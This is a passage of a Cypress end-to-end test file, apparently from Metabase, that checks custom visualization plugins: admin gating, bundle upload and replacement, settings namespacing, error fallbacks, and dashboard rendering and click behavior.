import {
  SAMPLE_DB_ID,
  SAMPLE_DB_TABLES,
  USER_GROUPS,
} from "e2e/support/cypress_data";
import {
  type DashboardDetails,
  type StructuredQuestionDetails,
  adminAppLinkText,
  mainAppLinkText,
} from "e2e/support/helpers";
import { b64hash_to_utf8 } from "metabase/utils/encoding";
import { checkNotNull } from "metabase/utils/types";
import type {
  CardId,
  CustomVizPlugin,
  DashboardId,
  DocumentContent,
  Parameter,
  UnsavedCard,
} from "metabase-types/api";

const { H } = cy;

const { ALL_USERS_GROUP } = USER_GROUPS;
const AGGREGATED_VALUE = "18760";
const AGGREGATED_VALUE_FORMATTED = "18,760";

function drillThroughDemoVizClick() {
  cy.intercept("POST", "/api/dataset").as("demoVizDrillDataset");
  cy.findByTestId("demo-viz-click-target").click();
  cy.findByTestId("click-actions-view")
    .findByText(/See these Orders/)
    .should("be.visible")
    .click();
  cy.wait("@demoVizDrillDataset");
}

function buildDocumentWithCustomVizCard(cardId: CardId): DocumentContent {
  return {
    type: "doc",
    content: [
      {
        type: "paragraph",
        attrs: { _id: "1" },
        content: [{ type: "text", text: "Custom viz embedded below:" }],
      },
      {
        type: "resizeNode",
        attrs: { height: 400, minHeight: 280 },
        content: [
          {
            type: "cardEmbed",
            attrs: { id: cardId, name: null, _id: "2" },
          },
        ],
      },
      { type: "paragraph", attrs: { _id: "3" } },
    ],
  };
}

describe("admin > custom visualizations", () => {
  beforeEach(() => {
    H.restore();
    cy.signInAsAdmin();
  });

  describe("feature gating", () => {
    describe("EE", () => {
      it("should show upsell when feature is locked, then enable and disable custom visualizations", () => {
        cy.log("No token activation — feature is locked");
        H.visitCustomVizSettings();

        cy.findByRole("heading", {
          name: /Build your own visualizations/,
        }).should("be.visible");
        H.getAddVisualizationLink().should("not.exist");

        H.activateToken("bleeding-edge");
        H.visitCustomVizSettings();

        cy.log(
          "Enabling custom viz is blocked until the image CSP setting is on",
        );
        H.main()
          .findByRole("button", { name: /Enable custom visualizations/ })
          .should("be.disabled");
        H.main()
          .findByText(/Turn on "Restrict image domains"/)
          .should("be.visible");

        cy.log("Turn on the image CSP setting, then custom viz can be enabled");
        H.updateSetting("csp-img-enabled", true);
        cy.reload();

        H.main()
          .findByRole("button", { name: /Enable custom visualizations/ })
          .should("be.enabled")
          .click();

        H.getAddVisualizationLink().should("be.visible");

        cy.log("Deactivate custom visualizations");
        H.main()
          .findByRole("button", { name: /More options/ })
          .click();
        H.popover().findByText("Deactivate custom visualizations").click();

        H.main()
          .findByRole("heading", { name: "Enable custom visualizations" })
          .should("be.visible");
        H.getAddVisualizationLink().should("not.exist");
      });

      it('should not show custom visualizations page to non-admins with "Settings access" permission', () => {
        H.activateToken("bleeding-edge");
        H.updateAdvancedPermissionsGraph({
          [ALL_USERS_GROUP]: { setting: "yes" },
        });
        cy.signInAsNormalUser();

        cy.visit("/admin/settings/custom-visualizations");
        H.main().should(
          "include.text",
          "Sorry, you don’t have permission to see that.",
        );

        H.goToAdmin();
        cy.findByTestId("admin-layout-sidebar")
          .findByText("Maps")
          .should("be.visible");
        cy.findByTestId("admin-layout-sidebar")
          .findByText("Custom visualizations")
          .should("not.exist");
      });

      it("should not show nested sidebar navigation when custom viz plugin dev mode is disabled", () => {
        cy.intercept("GET", "/api/session/properties", (req) => {
          req.continue((res) => {
            res.body["custom-viz-plugin-dev-mode-enabled"] = false;
          });
        });

        H.activateToken("bleeding-edge");
        H.updateSetting("csp-img-enabled", true);
        H.updateSetting("custom-viz-enabled", true);
        H.visitCustomVizSettings();
        H.getAddVisualizationLink().click();

        cy.findByTestId("admin-layout-sidebar")
          .findByRole("link", { name: /Custom visualizations/ })
          .should("have.attr", "data-active", "true");
        cy.findByTestId("admin-layout-sidebar")
          .findByRole("link", { name: /Development/ })
          .should("not.exist");
        cy.findByTestId("admin-layout-sidebar")
          .findByRole("link", { name: /Manage visualizations/ })
          .should("not.exist");

        H.dropCustomVizBundle(H.CUSTOM_VIZ_FIXTURE_TGZ);
        cy.findByRole("button", { name: "Add visualization" }).click();

        H.main().findByText("demo-viz").realHover();
        cy.findByRole("button", { name: "Plugin actions" }).click();
        H.popover().findByText("Replace bundle").click();

        cy.findByTestId("admin-layout-sidebar")
          .findByRole("link", { name: /Custom visualizations/ })
          .should("have.attr", "data-active", "true");
      });
    });

    describe("OSS", { tags: "@OSS" }, () => {
      it("should show upsell when feature is locked", () => {
        H.visitCustomVizSettings();

        cy.findByRole("heading", {
          name: /Build your own visualizations/,
        }).should("be.visible");
        cy.findByRole("link", { name: "Try for free" }).should("be.visible");
        H.getAddVisualizationLink().should("not.exist");
      });
    });
  });

  describe("admin settings page", () => {
    beforeEach(() => {
      H.activateToken("bleeding-edge");
      H.updateSetting("csp-img-enabled", true);
      H.updateSetting("custom-viz-enabled", true);
    });

    it("should reject an invalid bundle inline, then add a plugin via the form and show it in the list", () => {
      H.resetSnowplow();
      H.enableTracking();
      H.visitCustomVizNewForm();

      cy.findByRole("link", { name: /Manage visualizations/ }).should(
        "have.attr",
        "data-active",
        "true",
      );
      cy.findByRole("link", { name: /Development/ }).should("be.visible");

      cy.log("Submit is disabled until a file is selected");
      cy.findByRole("button", { name: "Add visualization" }).should(
        "be.disabled",
      );

      cy.log("Upload a non-tar.gz file so the BE rejects it.");
      H.dropCustomVizBundle({
        contents: Cypress.Buffer.from("not a tarball"),
        fileName: "broken.tgz",
        mimeType: "application/gzip",
      });

      cy.intercept("POST", "/api/ee/custom-viz-plugin").as(
        "pluginCreateInvalid",
      );
      cy.findByRole("button", { name: "Add visualization" }).click();

      cy.wait("@pluginCreateInvalid")
        .its("response.statusCode")
        .should("eq", 400);

      cy.log("Error is surfaced inline in the form");
      cy.findByTestId("custom-viz-settings-form").within(() => {
        cy.findByText(/Bundle is not a valid tar\.gz archive/).should(
          "be.visible",
        );
      });

      cy.location("pathname").should(
        "eq",
        "/admin/settings/custom-visualizations/new",
      );

      cy.log("Upload a valid bundle");
      H.dropCustomVizBundle(H.CUSTOM_VIZ_FIXTURE_TGZ);

      H.interceptPluginCreate();
      cy.findByRole("button", { name: "Add visualization" }).click();
      cy.wait("@pluginCreate");

      cy.log("Should redirect to the list and show the plugin");
      H.main().findByText("demo-viz").should("be.visible");
      H.expectUnstructuredSnowplowEvent({
        event: "custom_viz_plugin_created",
        result: "success",
      });
      H.expectNoBadSnowplowEvents();
    });

    it("should support multiple plugins and display their manifest information and bundle hash", () => {
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ);
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ_2);
      H.visitCustomVizSettings();

      H.getCustomVizPluginIcon("demo-viz").should("be.visible");
      H.main().findByText("demo-viz").should("be.visible");
      H.main().findByText("demo-viz-2").should("be.visible");

      cy.log(
        "Bundle hash chip is the first 8 chars of the fixture's deterministic SHA-256",
      );
      H.getCustomVizFixtureHash(H.CUSTOM_VIZ_FIXTURE_TGZ).then((hash) => {
        H.main()
          .findByText(`Bundle: ${hash.slice(0, 8)}`)
          .should("be.visible");
      });

      H.main()
        .findAllByText(/^Requires Metabase /)
        .should("have.length", 2);

      // Both plugins should be available in chart type selector
      H.openOrdersTable({ limit: 1 });
      cy.findByTestId("viz-type-button").click();
      H.main().findByText("Custom visualizations").should("be.visible").click();
      H.main().findByText("demo-viz").should("be.visible");
      H.main().findByText("demo-viz-2").should("be.visible");
    });

    it("should reject a non-matching bundle inline, then replace the bundle via the edit form", () => {
      H.resetSnowplow();
      H.enableTracking();
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ).then(
        (plugin: CustomVizPlugin) => {
          H.visitCustomVizEditForm(plugin.id);

          cy.findByRole("link", { name: /Manage visualizations/ }).should(
            "have.attr",
            "data-active",
            "true",
          );

          cy.log(
            'The 2nd fixture has manifest.name = "demo-viz-2" — BE rejects because it does not match the existing identifier',
          );
          H.dropCustomVizBundle(H.CUSTOM_VIZ_FIXTURE_TGZ_2);

          cy.intercept(
            "PUT",
            `/api/ee/custom-viz-plugin/${plugin.id}/bundle`,
          ).as("pluginBundleReplace");
          cy.findByRole("button", { name: /Replace$/ }).click();

          cy.wait("@pluginBundleReplace")
            .its("response.statusCode")
            .should("eq", 400);

          cy.findByTestId("custom-viz-settings-form").within(() => {
            cy.findByText(/does not match the plugin's identifier/).should(
              "be.visible",
            );
          });

          cy.location("pathname").should(
            "eq",
            `/admin/settings/custom-visualizations/edit/${plugin.id}`,
          );

          H.visitCustomVizSettings();

          cy.log(
            "Replace bundle is reachable only via the row's Plugin actions menu — clicking the row itself does not navigate",
          );
          H.main().findByText("demo-viz").click();
          cy.location("pathname").should(
            "eq",
            "/admin/settings/custom-visualizations",
          );
          cy.findByRole("heading", {
            name: /Replace bundle for/,
          }).should("not.exist");

          // Actions menu is only visible on row hover
          H.main().findByText("demo-viz").realHover();
          cy.findByRole("button", { name: "Plugin actions" }).click();
          H.popover().findByText("Replace bundle").click();

          cy.findByRole("heading", {
            name: "Replace bundle for demo-viz",
          }).should("be.visible");

          H.dropCustomVizBundle(H.CUSTOM_VIZ_FIXTURE_TGZ);
          cy.findByRole("button", { name: /Replace$/ }).click();

          cy.wait("@pluginBundleReplace")
            .its("response.statusCode")
            .should("eq", 200);

          cy.log("Should redirect back to the list page");
          cy.location("pathname").should(
            "eq",
            "/admin/settings/custom-visualizations",
          );
          H.main().findByText("demo-viz").should("be.visible");
          H.expectUnstructuredSnowplowEvent({
            event: "custom_viz_plugin_updated",
            result: "success",
          });
          H.expectNoBadSnowplowEvents();
        },
      );
    });

    it("question should fall back when its plugin is disabled, and when it is removed", () => {
      H.resetSnowplow();
      H.enableTracking();
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ).then(() => {
        // Single-value question (Count of Orders) — demo-viz requires
        // exactly one row with one numeric column.
        H.createQuestion(
          {
            name: "Custom Viz Disable Test",
            query: {
              "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
              aggregation: [["count"]],
            },
            display: H.CUSTOM_VIZ_DISPLAY,
          },
          { wrapId: true, idAlias: "disableCardId", visitQuestion: true },
        );
        H.main()
          .findByText("Custom viz rendered successfully")
          .should("be.visible");

        H.getProfileLink().click();
        H.popover().findByText(adminAppLinkText).click();

        cy.findByTestId("admin-layout-sidebar")
          .findByText("Custom visualizations")
          .click();

        cy.findByTestId("admin-layout-sidebar")
          .findByText("Manage visualizations")
          .should("be.visible")
          .click();

        // Actions menu is only visible on row hover
        H.main().findByText("demo-viz").realHover();
        cy.findByRole("button", { name: "Plugin actions" }).click();
        H.popover().findByText("Disable").click();
        H.expectUnstructuredSnowplowEvent({
          event: "custom_viz_plugin_toggled",
          event_detail: "disabled",
        });

        // Menu should now show "Enable" instead of "Disable"
        H.main().findByText("demo-viz").realHover();
        cy.findByRole("button", { name: "Plugin actions" }).click();
        H.popover().findByText("Enable").should("be.visible");

        H.getProfileLink().click();
        H.popover().findByText(mainAppLinkText).click();

        cy.get("main").within(() => {
          cy.contains("Custom Viz Disable Test").click();
        });

        cy.log("make sure viz is table - fallback");
        cy.findByTestId("table-root").should("be.visible");

        // Custom viz section should not appear in chart type selector
        cy.findByTestId("viz-type-button").click();
        cy.findByTestId("Table-button").should("be.visible");
        cy.findByText("Custom visualizations").should("not.exist");

        cy.log("make sure fallback is used after reload");
        cy.reload();
        cy.findByTestId("table-root").should("be.visible");
        cy.findByTestId("viz-type-button").click();
        cy.findByTestId("Table-button").should("be.visible");
        cy.findByText("Custom visualizations").should("not.exist");

        cy.log("Enable the plugin again, then remove it");
        H.visitCustomVizSettings();
        H.main().findByText("demo-viz").realHover();
        cy.findByRole("button", { name: "Plugin actions" }).click();
        H.popover().findByText("Enable").click();
        H.expectUnstructuredSnowplowEvent({
          event: "custom_viz_plugin_toggled",
          event_detail: "enabled",
        });

        H.main().findByText("demo-viz").realHover();
        cy.findByRole("button", { name: "Plugin actions" }).click();
        H.popover().findByText("Remove").click();

        H.modal().within(() => {
          cy.findByText("Remove this visualization?").should("be.visible");
          cy.findByRole("button", { name: "Remove" }).click();
        });

        H.main()
          .findByText("You don't have any custom visualizations.")
          .should("be.visible");
        H.expectUnstructuredSnowplowEvent({
          event: "custom_viz_plugin_deleted",
        });

        // Visit the question — should fall back to table
        H.visitQuestion("@disableCardId");
        cy.findByTestId("table-root").should("be.visible");

        // Custom viz section should not appear in chart type selector
        cy.findByTestId("viz-type-button").click();
        cy.findByTestId("Table-button").should("be.visible");
        cy.findByText("Custom visualizations").should("not.exist");
        H.expectNoBadSnowplowEvents();
      });
    });
  });

  describe("using a plugin — question", () => {
    beforeEach(() => {
      H.activateToken("bleeding-edge");
      H.updateSetting("csp-img-enabled", true);
      H.updateSetting("custom-viz-enabled", true);
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ);
    });

    // Default-view (table) Count-of-Orders card — demo-viz requires
    // exactly one row with one numeric column.
    function createCountQuestion() {
      H.createQuestion(
        {
          name: "Custom Viz Question Test",
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: "table",
        },
        { wrapId: true, idAlias: "questionId" },
      );
    }

    function switchToDemoViz() {
      cy.findByTestId("viz-type-button").click();
      cy.findByTestId("custom-viz-plugins-toggle").click();
      cy.findByTestId("demo-viz-button").click();
      // Close the picker so the viz is visible for interaction
      cy.findByTestId("viz-type-button").click();
    }

    it("renders the selected custom viz and persists its settings, pinned and across reloads", () => {
      createCountQuestion();
      H.resetSnowplow();
      H.enableTracking();
      H.visitQuestion("@questionId");
      switchToDemoViz();

      H.main()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");
      H.main()
        .findByText(/Value: \d+/)
        .should("be.visible");
      // Default threshold from getDefault
      H.main().findByText("Threshold: 0").should("be.visible");

      cy.findByTestId("demo-viz-measured-width")
        .invoke("text")
        .then((text) => {
          const measuredWidth = Number(text.replace(/\D/g, ""));
          expect(measuredWidth).to.be.within(197, 217);
        });
      cy.findByTestId("demo-viz-measured-height")
        .invoke("text")
        .then((text) => {
          const measuredHeight = Number(text.replace(/\D/g, ""));
          expect(measuredHeight).to.be.within(10, 15);
        });
      cy.findByTestId("demo-viz-brand-color")
        .invoke("text")
        .should("match", /Brand color: (#[0-9a-fA-F]{3,8}|(rgb|hsl)a?\(.+\))$/);
      cy.findByTestId("demo-viz-font-family").should("contain", "Lato");
      cy.findByTestId("demo-viz-color-scheme").should(
        "have.text",
        "Color scheme: light",
      );

      H.expectUnstructuredSnowplowEvent({ event: "custom_viz_selected" });
      H.expectNoBadSnowplowEvents();

      cy.log("onHover renders a tooltip");
      cy.findByTestId("demo-viz-hover-target").realHover();
      H.tooltip().should("contain.text", AGGREGATED_VALUE_FORMATTED);
      H.queryBuilderHeader().realHover();
      H.tooltip().should("not.exist");

      cy.log(
        "The plugin gets its own array-valued settings, including edits made in the session",
      );
      cy.findByTestId("demo-viz-columns").should("have.text", "Columns: count");

      cy.findByTestId("viz-settings-button").click();
      cy.findByTestId("chartsettings-sidebar")
        .findByRole("button", { name: "Add column from plugin" })
        .click();
      cy.findByTestId("demo-viz-columns").should(
        "have.text",
        "Columns: count, extra",
      );
      cy.findByTestId("chartsettings-sidebar")
        .findByRole("button", { name: "Add column from plugin" })
        .should("be.visible");

      cy.log("Plugin writes to Metabase settings stay inside its namespace");
      cy.findByTestId("chartsettings-sidebar")
        .findByRole("button", { name: "Rename question from plugin" })
        .click();
      H.main().findByText("Threshold: 7").should("be.visible");
      H.saveSavedQuestion();

      cy.get("@questionId").then((id) => {
        cy.request("GET", `/api/card/${id}`).then(({ body }) => {
          expect(body.visualization_settings).to.have.property(
            `custom:${H.CUSTOM_VIZ_IDENTIFIER}:threshold`,
            7,
          );
        });
      });

      cy.findByTestId("chartsettings-sidebar")
        .findByPlaceholderText("Set threshold")
        .clear()
        .type("42")
        .blur();
      H.main().findByText("Threshold: 42").should("be.visible");

      cy.log(
        "The column formatting popover opens from a field setting (metabase#78039)",
      );
      cy.findByTestId("chartsettings-sidebar")
        .findByTestId("settings-count")
        .click();

      cy.findByTestId("chart-settings-widget-popover-content").within(() => {
        cy.findByText("Add a prefix").should("be.visible");
        cy.findByPlaceholderText("$").type("foo").blur();
      });

      H.main()
        .findByTestId("demo-viz-formatted-value")
        .should("contain", "foo");
      cy.realPress("Escape");
      cy.findByTestId("chart-settings-widget-popover-content").should(
        "not.exist",
      );

      H.saveSavedQuestion();

      cy.log("plugin settings are stored under the plugin's namespace");
      cy.get("@questionId").then((id) => {
        cy.request("GET", `/api/card/${id}`).then(({ body }) => {
          expect(body.visualization_settings).to.have.property(
            `custom:${H.CUSTOM_VIZ_IDENTIFIER}:threshold`,
            42,
          );
          expect(body.visualization_settings).to.have.property(
            `custom:${H.CUSTOM_VIZ_IDENTIFIER}:card.title`,
            "Plugin title",
          );
          expect(body.visualization_settings).to.have.deep.property(
            `custom:${H.CUSTOM_VIZ_IDENTIFIER}:columns`,
            ["count", "extra"],
          );
          expect(body.visualization_settings).not.to.have.property("threshold");
          expect(body.visualization_settings).not.to.have.property(
            "card.title",
          );
        });
      });

      H.interceptPluginBundle();
      cy.reload();
      cy.wait("@pluginBundle");

      H.main()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");
      H.main().findByText("Threshold: 42").should("be.visible");

      // Default user locale is "en"
      cy.findByTestId("demo-viz-locale").should("have.text", "Locale: en");

      cy.log("A pinned custom-viz question renders in the collection view");
      cy.get("@questionId").then((id) => {
        cy.request("PUT", `/api/card/${id}`, { collection_position: 1 });
      });

      // Navigate to the collection via the question header's collection badge
      cy.findByRole("link", { name: /Our analytics/ }).click();

      H.getPinnedSection().within(() => {
        cy.findByText("Custom Viz Question Test").should("be.visible");
        cy.findByText("A question").should("be.visible");
      });

      cy.log(
        "The plugin gets the user's locale and updates when the user changes it",
      );
      H.getPinnedSection().findByText("Custom Viz Question Test").click();
      cy.findByTestId("demo-viz-locale").should("have.text", "Locale: en");

      // Change the current user's locale to German. The plugin factory runs
      // again on the next full page load with the new locale value.
      cy.request("GET", "/api/user/current").then(({ body: user }) => {
        cy.request("PUT", `/api/user/${user.id}`, { locale: "de" });
      });

      H.interceptPluginBundle();
      cy.reload();
      cy.wait("@pluginBundle");

      cy.findByTestId("demo-viz-locale").should("have.text", "Locale: de");
    });

    it("reads and migrates plugin settings saved before namespacing", () => {
      H.createQuestion(
        {
          name: "Legacy Custom Viz Settings",
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: H.CUSTOM_VIZ_DISPLAY,
          visualization_settings: { threshold: 42 },
        },
        { visitQuestion: true, wrapId: true, idAlias: "legacyQuestionId" },
      );
      H.main().findByText("Threshold: 42").should("be.visible");

      cy.findByTestId("viz-settings-button").click();
      cy.findByTestId("chartsettings-sidebar")
        .findByPlaceholderText("Set threshold")
        .clear()
        .type("43")
        .blur();
      H.main().findByText("Threshold: 43").should("be.visible");
      H.saveSavedQuestion();

      cy.log("the first edit moves the bare key under the plugin's namespace");
      cy.get("@legacyQuestionId").then((id) => {
        cy.request("GET", `/api/card/${id}`).then(({ body }) => {
          expect(body.visualization_settings).to.have.property(
            `custom:${H.CUSTOM_VIZ_IDENTIFIER}:threshold`,
            43,
          );
          expect(body.visualization_settings).not.to.have.property("threshold");
        });
      });
    });

    it("keeps an unsaved question's custom viz after a browser reload (metabase#76065)", () => {
      H.visitQuestionAdhoc({
        dataset_query: {
          database: SAMPLE_DB_ID,
          type: "query",
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
        },
      });

      cy.findByTestId("scalar-value").should("be.visible");
      switchToDemoViz();
      H.main()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");

      cy.location("hash").should((hash) => {
        const card: UnsavedCard = JSON.parse(b64hash_to_utf8(hash));
        expect(card.display).to.eq(H.CUSTOM_VIZ_DISPLAY);
        expect(card.displayIsLocked).to.eq(true);
      });

      H.interceptPluginBundle();
      cy.reload();
      cy.wait("@pluginBundle");

      H.main()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");
      cy.findByTestId("scalar-value").should("not.exist");
    });

    describe("errors", () => {
      it("renders errors thrown by the plugin component", () => {
        // Multi-column question — checkRenderable throws
        // "Query results should only have 1 column".
        H.createQuestion(
          {
            name: "Custom Viz Error — Multi Column",
            query: {
              "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
              limit: 5,
            },
            display: H.CUSTOM_VIZ_DISPLAY,
          },
          { visitQuestion: true },
        );

        H.main()
          .findByText(/Query results should only have 1 column/)
          .should("be.visible");
      });

      it("shows a single combined toast when multiple plugin bundles fail to load (metabase#GDGT-3076)", () => {
        H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ_2);
        H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ_3_SECURITY);
        H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ_4_SECURITY_COMPONENT);

        cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", {
          statusCode: 500,
          body: "boom",
        }).as("failedBundle");

        createCountQuestion();
        H.visitQuestion("@questionId");
        cy.findByTestId("viz-type-button").click();
        cy.wait([
          "@failedBundle",
          "@failedBundle",
          "@failedBundle",
          "@failedBundle",
        ]);

        H.undoToastList()
          .should("have.length", 1)
          .findByText(
            '4 visualizations are currently unavailable: "demo-viz", "demo-viz-2", "demo-viz-security", "demo-viz-security-component".',
          )
          .should("be.visible")
          // The message must wrap instead of truncating, i.e. be taller than one line
          .invoke("outerHeight")
          .should("be.gt", 30);

        // The message must not collapse to min-content
        H.undoToastList().invoke("outerWidth").should("be.within", 300, 700);
      });

      it("falls back to the default viz when the bundle endpoint fails, then recovers on revisit", () => {
        const bundleMatcher = {
          method: "GET",
          pathname: "/api/ee/custom-viz-plugin/*/bundle",
        };

        cy.intercept(bundleMatcher, {
          statusCode: 503,
          body: { error: "Bundle not available" },
        }).as("bundleUnavailable");

        H.createQuestion(
          {
            name: "Custom Viz — Bundle Recovery",
            query: {
              "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
              aggregation: [["count"]],
            },
            display: H.CUSTOM_VIZ_DISPLAY,
          },
          { wrapId: true, idAlias: "recoveryCardId", visitQuestion: true },
        );

        cy.findByTestId("visualization-root")
          .findByTestId("table-root")
          .should("be.visible");

        H.undoToastList()
          .findByText(/"demo-viz" visualization is currently unavailable/)
          .should("be.visible");

        cy.intercept(bundleMatcher, (req) => req.continue()).as(
          "bundleRestored",
        );

        cy.reload();

        H.main()
          .findByText("Custom viz rendered successfully")
          .should("be.visible");
      });
    });

    it("falls back to the default viz on a public and an embedded question (metabase#GDGT-2234)", () => {
      H.updateSetting("enable-public-sharing", true);

      H.createQuestion(
        {
          name: "Public Custom Viz Fallback",
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: H.CUSTOM_VIZ_DISPLAY,
        },
        { wrapId: true, idAlias: "publicQuestionId" },
      );

      cy.get<CardId>("@publicQuestionId").then(H.visitPublicQuestion);

      cy.findByTestId("embed-frame").within(() => {
        cy.findByTestId("table-root").should("be.visible");
        cy.findByText("Custom viz rendered successfully").should("not.exist");
      });

      cy.get<CardId>("@publicQuestionId").then((questionId) => {
        cy.request("PUT", `/api/card/${questionId}`, {
          enable_embedding: true,
        });

        H.visitEmbeddedPage({
          resource: { question: questionId },
          params: {},
        });
      });

      cy.findByTestId("embed-frame").within(() => {
        cy.findByTestId("table-root").should("be.visible");
        cy.findByText("Custom viz rendered successfully").should("not.exist");
      });
    });

    it("calls onClick when the viz fires a click", () => {
      createCountQuestion();
      H.visitQuestion("@questionId");
      switchToDemoViz();

      H.main()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");

      drillThroughDemoVizClick();

      // Drill opens an ad-hoc question showing the underlying Orders rows
      H.queryBuilderHeader().findByText("Orders").should("be.visible");
      H.tableInteractive().findByText("37.65").should("be.visible");
    });

    it("switches away from a custom viz that cannot render the drilled data, and restores it when navigating back and forth (metabase#GDGT-2218)", () => {
      H.createQuestion(
        {
          name: "Custom Viz Drill Question",
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: H.CUSTOM_VIZ_DISPLAY,
        },
        { visitQuestion: true },
      );

      H.main()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");

      cy.findByTestId("demo-viz-click-target").click();
      cy.findByTestId("click-actions-view")
        .findByText(/^Break out by/)
        .click();
      H.popover().findByText("Time").click();
      H.popover().findByText("Created At").click();

      H.echartsContainer().should("be.visible");
      H.main()
        .findByText("Custom viz rendered successfully")
        .should("not.exist");

      cy.go("back");

      H.main()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");

      cy.go("forward");

      H.echartsContainer().should("be.visible");
      H.main()
        .findByText("Custom viz rendered successfully")
        .should("not.exist");
    });
  });

  describe("using a plugin — dashboard", () => {
    beforeEach(() => {
      H.activateToken("bleeding-edge");
      H.updateSetting("csp-img-enabled", true);
      H.updateSetting("custom-viz-enabled", true);
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ);
    });

    const customVizQuestionDetails: StructuredQuestionDetails = {
      name: "Custom Viz Dashboard Question",
      query: {
        "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
        aggregation: [["count"]],
      },
      display: H.CUSTOM_VIZ_DISPLAY,
      visualization_settings: { threshold: 0 },
    };

    function createCustomVizDashboard(dashboardDetails: DashboardDetails = {}) {
      return H.createQuestionAndDashboard({
        questionDetails: customVizQuestionDetails,
        dashboardDetails: { name: "Custom Viz Dashboard", ...dashboardDetails },
      });
    }

    it("falls back to the default viz on a public and an embedded dashboard (metabase#GDGT-2234)", () => {
      H.updateSetting("enable-public-sharing", true);

      createCustomVizDashboard().then(({ body: dashcard }) => {
        const dashboardId = Number(checkNotNull(dashcard.dashboard_id));
        cy.wrap(dashboardId).as("dashboardId");
        H.visitPublicDashboard(dashboardId);
      });

      H.getDashboardCard().findByTestId("table-root").should("be.visible");
      H.getDashboardCard()
        .findByText("Custom viz rendered successfully")
        .should("not.exist");

      cy.get<DashboardId>("@dashboardId").then((dashboardId) => {
        cy.request("PUT", `/api/dashboard/${dashboardId}`, {
          enable_embedding: true,
        });

        H.visitEmbeddedPage({
          resource: { dashboard: dashboardId },
          params: {},
        });
      });

      H.getDashboardCard().findByTestId("table-root").should("be.visible");
      H.getDashboardCard()
        .findByText("Custom viz rendered successfully")
        .should("not.exist");
    });

    it("renders a custom viz question on a dashboard, shows a tooltip, exports a PDF and drills through on click", () => {
      cy.deleteDownloadsFolder();

      createCustomVizDashboard({ name: "custom viz pdf dash" }).then(
        ({ body: dashcard }) => {
          H.visitDashboard(dashcard.dashboard_id);
        },
      );

      H.getDashboardCard()
        .findByText("Custom viz rendered successfully")
        .should("be.visible");
      H.getDashboardCard()
        .findByText(`Value: ${AGGREGATED_VALUE}`)
        .should("be.visible");

      cy.log("Tooltip on hover");
      H.getDashboardCard().findByTestId("demo-viz-hover-target").realHover();
      H.tooltip().should("contain.text", AGGREGATED_VALUE_FORMATTED);
      cy.findByTestId("dashboard-header").realHover();
      H.tooltip().should("not.exist");

      cy.log("Export as PDF");
      H.openSharingMenu("Export as PDF");
      cy.findByTestId("status-root-container")
        .should("contain", "Downloading")
        .and("contain", "Dashboard for custom viz pdf dash");
      cy.verifyDownload("custom viz pdf dash.pdf", { contains: true });

      cy.log("Drill through on click");
      drillThroughDemoVizClick();

      H.queryBuilderHeader().findByText("Orders").should("be.visible");
      // The demo plugin's query is `count(Orders)` with no breakout, so the
      // underlying-records drill produces an unfiltered Orders query.
      H.tableInteractive().findByText("37.65").should("be.visible");
      H.queryBuilderFiltersPanel().should("not.exist");
    });

    it("follows click behavior custom destinations: URL, crossfilter, saved question and dashboard", () => {
      const parameter: Parameter = {
        id: "12345678",
        name: "Count",
        slug: "count",
        type: "number/=",
      };

      H.createDashboard(
        { name: "Custom Viz Target Dashboard" },
        { wrapId: true, idAlias: "targetDashboardId" },
      );
      H.createQuestion(
        {
          name: "Custom Viz Target Question",
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            limit: 5,
          },
        },
        { wrapId: true, idAlias: "targetQuestionId" },
      );

      cy.get<DashboardId>("@targetDashboardId").then((targetDashboardId) => {
        cy.get<CardId>("@targetQuestionId").then((targetQuestionId) => {
          H.createQuestionAndDashboard({
            questionDetails: customVizQuestionDetails,
            dashboardDetails: {
              name: "Custom Viz Click Behavior Dashboard",
              parameters: [parameter],
            },
          }).then(({ body: dashcard }) => {
            const card_id = checkNotNull(dashcard.card_id);
            H.updateDashboardCards({
              dashboard_id: dashcard.dashboard_id,
              cards: [
                {
                  card_id,
                  row: 0,
                  col: 0,
                  visualization_settings: {
                    click_behavior: {
                      linkType: "url",
                      linkTemplate: "https://metabase.test/custom-viz",
                      type: "link",
                    },
                  },
                },
                {
                  card_id,
                  row: 0,
                  col: 12,
                  visualization_settings: {
                    click_behavior: {
                      type: "crossfilter",
                      parameterMapping: {
                        [parameter.id]: {
                          id: parameter.id,
                          source: {
                            id: "count",
                            name: "Count",
                            type: "column",
                          },
                          target: { id: parameter.id, type: "parameter" },
                        },
                      },
                    },
                  },
                },
                {
                  card_id,
                  row: 8,
                  col: 0,
                  visualization_settings: {
                    click_behavior: {
                      parameterMapping: {},
                      targetId: targetQuestionId,
                      linkType: "question",
                      type: "link",
                    },
                  },
                },
                {
                  card_id,
                  row: 8,
                  col: 12,
